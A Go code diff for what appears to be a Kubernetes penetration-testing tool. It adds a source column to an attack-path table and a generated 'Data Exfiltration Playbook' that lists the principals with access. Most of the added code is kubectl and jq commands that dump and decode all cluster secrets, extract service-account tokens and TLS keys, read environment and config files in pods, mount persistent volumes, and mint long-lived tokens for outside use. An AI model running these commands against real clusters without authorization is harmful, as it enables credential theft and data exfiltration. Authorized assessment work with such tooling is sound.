@@ -154,6 +154,7 @@ func runDataExfiltrationCommand(cmd *cobra.Command, args []string) {
 func (m *DataExfiltrationModule) buildExfilTables() []internal.TableFile {
 	headers := []string{
 		"Risk Level",
+		"Source",
 		"Scope",
 		"Principal",
 		"Principal Type",
@@ -179,9 +180,14 @@ func (m *DataExfiltrationModule) buildExfilTables() []internal.TableFile {
 		if path.ScopeType == "cluster" {
 			scope = "cluster-wide"
 		}
+		source := path.SourceType
+		if source == "" {
+			source = "core"
+		}
 
 		body = append(body, []string{
 			path.RiskLevel,
+			source,
 			scope,
 			path.Principal,
 			path.PrincipalType,
@@ -366,12 +372,340 @@ func (m *DataExfiltrationModule) generateExfilLoot() []internal.LootFile {
 	}
 	lootContent = append(lootContent, "")
 
+	// Build playbook content
+	methodGroups := groupExfilByMethod(m.AllPaths)
+	playbookContent := m.generateExfilPlaybook(methodGroups)
+
 	return []internal.LootFile{
 		{
 			Name:     "DataExfiltration-Commands",
 			Contents: strings.Join(lootContent, "\n"),
 		},
+		{
+			Name:     "DataExfiltration-Playbook",
+			Contents: playbookContent,
+		},
 	}
+}
+
+// generateExfilPlaybook creates a reference-style guide for data exfiltration organized by data type
+func (m *DataExfiltrationModule) generateExfilPlaybook(methodGroups map[string][]attackpathservice.AttackPath) string {
+	var content []string
+
+	content = append(content, "#####################################")
+	content = append(content, "##### Data Exfiltration Playbook")
+	content = append(content, "##### Reference Guide by Data Type")
+	content = append(content, "#####################################")
+	content = append(content, "")
+
+	// Secrets
+	content = append(content, `
+##############################################
+## SECRETS
+##############################################
+# Extract credentials, API keys, TLS certificates, SA tokens`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "Secrets"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with secret access")
+	}
+	content = append(content, `
+# List all secrets cluster-wide:
+kubectl get secrets -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type'
+
+# Extract and decode ALL secrets:
+kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name):\n\(.data | to_entries | map("  \(.key): \(.value | @base64d)") | join("\n"))"'
+
+# Find ServiceAccount tokens:
+kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name): \(.data.token | @base64d)"'
+
+# Find TLS certificates and keys:
+kubectl get secrets -A --field-selector type=kubernetes.io/tls -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name):\n  cert: \(.data["tls.crt"] | @base64d | split("\n")[0])...\n  key: \(.data["tls.key"] | @base64d | split("\n")[0])..."'
+
+# Find Docker registry credentials:
+kubectl get secrets -A --field-selector type=kubernetes.io/dockerconfigjson -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data[".dockerconfigjson"] | @base64d)"'
+
+# Find Opaque secrets (often contain passwords):
+kubectl get secrets -A --field-selector type=Opaque -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | map_values(@base64d))"'
+
+# Search secrets for specific patterns:
+kubectl get secrets -A -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value | @base64d)"' | grep -iE '(password|token|key|secret|credential)'`)
+
+	// ConfigMaps
+	content = append(content, `
+
+##############################################
+## CONFIGMAPS
+##############################################
+# Extract configuration files, connection strings, environment variables`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "ConfigMaps", "Config Access"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with configmap access")
+	}
+	content = append(content, `
+# List all configmaps:
+kubectl get configmaps -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name'
+
+# Extract all configmap data:
+kubectl get configmaps -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name):\n\(.data | to_entries | map("  \(.key): \(.value[:100])...") | join("\n"))"'
+
+# Search configmaps for sensitive data:
+kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value)"' | grep -iE '(password|secret|token|key|database|connection|jdbc|redis|mongo)'
+
+# Find kubeconfig files in configmaps:
+kubectl get configmaps -A -o json | jq -r '.items[] | select(.data | to_entries[] | .value | contains("apiVersion: v1") and contains("clusters:")) | "\(.metadata.namespace)/\(.metadata.name)"'`)
+
+	// Pod Logs
+	content = append(content, `
+
+##############################################
+## POD LOGS
+##############################################
+# Extract sensitive data from application logs`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "Logs"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with log access")
+	}
+	content = append(content, `
+# Get logs from all pods in a namespace:
+for pod in $(kubectl get pods -n NAMESPACE -o name); do echo "=== $pod ==="; kubectl logs $pod -n NAMESPACE --all-containers 2>/dev/null | head -100; done
+
+# Search logs for sensitive patterns:
+kubectl logs POD_NAME -n NAMESPACE --all-containers | grep -iE '(password|secret|token|key|credential|error|exception|failed)'
+
+# Get previous container logs (after crash):
+kubectl logs POD_NAME -n NAMESPACE --previous
+
+# Stream logs with timestamps:
+kubectl logs -f POD_NAME -n NAMESPACE --timestamps
+
+# Get logs from all containers in all pods:
+kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}' | while read ns pod; do echo "=== $ns/$pod ==="; kubectl logs $pod -n $ns --all-containers 2>/dev/null | grep -iE '(password|secret|token|api.key)' | head -10; done`)
+
+	// Pod Exec / Data Extraction
+	content = append(content, `
+
+##############################################
+## POD EXEC / DATA EXTRACTION
+##############################################
+# Execute commands in containers to extract files and data`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "Data Extraction", "Etcd Access"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with exec permissions")
+	}
+	content = append(content, `
+# Extract environment variables (often contain secrets):
+kubectl exec POD_NAME -n NAMESPACE -- env | sort
+
+# Extract SA token from inside container:
+kubectl exec POD_NAME -n NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Extract CA cert and namespace:
+kubectl exec POD_NAME -n NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+kubectl exec POD_NAME -n NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Copy files from container:
+kubectl cp NAMESPACE/POD_NAME:/path/to/file ./local-file
+
+# Find and extract sensitive files:
+kubectl exec POD_NAME -n NAMESPACE -- find / -name "*.key" -o -name "*.pem" -o -name "*.env" -o -name "*config*" 2>/dev/null
+kubectl exec POD_NAME -n NAMESPACE -- cat /app/.env 2>/dev/null
+
+# Extract database connection from common locations:
+kubectl exec POD_NAME -n NAMESPACE -- cat /app/config/database.yml 2>/dev/null
+kubectl exec POD_NAME -n NAMESPACE -- cat /etc/mysql/my.cnf 2>/dev/null
+
+# Dump process memory for secrets:
+kubectl exec POD_NAME -n NAMESPACE -- cat /proc/1/environ | tr '\0' '\n'`)
+
+	// Storage / PVC
+	content = append(content, `
+
+##############################################
+## STORAGE / PERSISTENT VOLUMES
+##############################################
+# Access data stored in persistent volumes`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "Storage"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with storage access")
+	}
+	content = append(content, `
+# List all PVCs:
+kubectl get pvc -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,VOLUME:.spec.volumeName,STORAGECLASS:.spec.storageClassName'
+
+# Find PVCs bound to interesting PVs:
+kubectl get pv -o json | jq -r '.items[] | select(.spec.hostPath != null) | "\(.metadata.name): hostPath=\(.spec.hostPath.path)"'
+
+# Create a pod to mount and read PVC data:
+cat <<'EOF' | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pvc-reader
+  namespace: TARGET_NAMESPACE
+spec:
+  containers:
+  - name: reader
+    image: alpine
+    command: ["sleep", "3600"]
+    volumeMounts:
+    - name: data
+      mountPath: /data
+  volumes:
+  - name: data
+    persistentVolumeClaim:
+      claimName: TARGET_PVC_NAME
+EOF
+
+# Then exec in and browse:
+kubectl exec -it pvc-reader -n TARGET_NAMESPACE -- ls -la /data
+kubectl exec -it pvc-reader -n TARGET_NAMESPACE -- find /data -type f -name "*.sql" -o -name "*.dump" -o -name "*.bak"`)
+
+	// Token Generation
+	content = append(content, `
+
+##############################################
+## TOKEN GENERATION
+##############################################
+# Generate SA tokens for use outside the cluster`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "Token Exfil"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with token generation permissions")
+	}
+	content = append(content, `
+# Generate token for a service account:
+kubectl create token SA_NAME -n NAMESPACE
+
+# Generate long-lived token (1 year):
+kubectl create token SA_NAME -n NAMESPACE --duration=8760h
+
+# Generate token with specific audience:
+kubectl create token SA_NAME -n NAMESPACE --audience=https://my-service.example.com
+
+# Use generated token externally:
+TOKEN=$(kubectl create token SA_NAME -n NAMESPACE)
+curl -sk -H "Authorization: Bearer $TOKEN" https://KUBERNETES_API/api/v1/namespaces`)
+
+	// CRD Secrets (cert-manager, external-secrets, vault)
+	content = append(content, `
+
+##############################################
+## CRD-BASED SECRETS
+##############################################
+# Extract secrets from cert-manager, external-secrets, vault, etc.`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "CRD Secrets (Certs)", "CRD Secrets (ExtSecrets)", "CRD Secrets (CSI)", "CRD Secrets (Vault)"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with CRD secrets access")
+	}
+	content = append(content, `
+# cert-manager - List certificates:
+kubectl get certificates -A -o wide
+kubectl get certificates -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): secret=\(.spec.secretName)"'
+
+# cert-manager - Extract certificate and key from secret:
+kubectl get secret CERT_SECRET -n NAMESPACE -o json | jq -r '.data["tls.crt"]' | base64 -d
+kubectl get secret CERT_SECRET -n NAMESPACE -o json | jq -r '.data["tls.key"]' | base64 -d
+
+# external-secrets - List ExternalSecrets:
+kubectl get externalsecrets -A -o wide
+kubectl get externalsecrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): target=\(.spec.target.name)"'
+
+# external-secrets - View SecretStore configs (may reveal cloud credentials):
+kubectl get secretstores -A -o yaml
+kubectl get clustersecretstores -o yaml
+
+# Vault - List VaultAuth configs:
+kubectl get vaultauths -A -o yaml
+kubectl get vaultconnections -A -o yaml
+
+# secrets-store-csi - List SecretProviderClasses:
+kubectl get secretproviderclasses -A -o yaml`)
+
+	// Custom Resources
+	content = append(content, `
+
+##############################################
+## CUSTOM RESOURCES
+##############################################
+# Extract sensitive data from application-specific CRDs`)
+	if entities := getExfilEntitiesForMethods(methodGroups, "Custom Resources"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with custom resource access")
+	}
+	content = append(content, `
+# List all CRDs in the cluster:
+kubectl get crds -o custom-columns='NAME:.metadata.name,GROUP:.spec.group'
+
+# Find CRDs that might contain sensitive data:
+kubectl get crds -o name | xargs -I{} kubectl get {} -A -o yaml 2>/dev/null | grep -iE '(password|secret|token|key|credential)' | head -50
+
+# Common sensitive CRDs to check:
+kubectl get sealedsecrets -A -o yaml 2>/dev/null          # Bitnami Sealed Secrets
+kubectl get externalsecrets -A -o yaml 2>/dev/null       # External Secrets Operator
+kubectl get secretclaims -A -o yaml 2>/dev/null          # Crossplane
+kubectl get databaseclusters -A -o yaml 2>/dev/null      # Database operators`)
+
+	return strings.Join(content, "\n")
+}
+
+// groupExfilByMethod groups paths by their Method field
+func groupExfilByMethod(paths []attackpathservice.AttackPath) map[string][]attackpathservice.AttackPath {
+	groups := make(map[string][]attackpathservice.AttackPath)
+	for _, path := range paths {
+		groups[path.Method] = append(groups[path.Method], path)
+	}
+	return groups
+}
+
+// getExfilEntitiesForMethods returns unique entities that have any of the specified methods
+func getExfilEntitiesForMethods(methodGroups map[string][]attackpathservice.AttackPath, methods ...string) []string {
+	seen := make(map[string]bool)
+	var entities []string
+
+	for _, method := range methods {
+		if paths, ok := methodGroups[method]; ok {
+			for _, path := range paths {
+				key := fmt.Sprintf("%s:%s", path.PrincipalType, path.Principal)
+				if !seen[key] {
+					seen[key] = true
+					entities = append(entities, fmt.Sprintf("%s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
+				}
+			}
+		}
+	}
+
+	return entities
 }
 
 // Helper functions
